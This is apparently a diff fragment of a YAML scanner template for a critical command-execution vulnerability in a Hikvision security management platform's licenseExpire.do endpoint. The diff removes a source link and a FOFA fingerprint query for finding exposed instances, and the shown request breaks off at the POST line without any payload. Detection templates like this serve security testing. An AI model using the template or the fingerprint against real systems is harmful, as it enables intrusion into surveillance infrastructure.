@@ -3,12 +3,8 @@ info:
   name: 海康威视综合安防管理平台licenseExpire.do存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bcxmqh75gx30qygm'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bcxmqh75gx30qygm
-    fofa: header ="portal/cas/loginPage"||body="id=wiportalTitle"||body="/home/locationIndex.action?time="||body="/views/home/file/installPackage.rar"||title="综合安防管理平台"||body="portal/lida-icon/lidaicon.css"||bo
 http:
 - raw:
   - 'POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
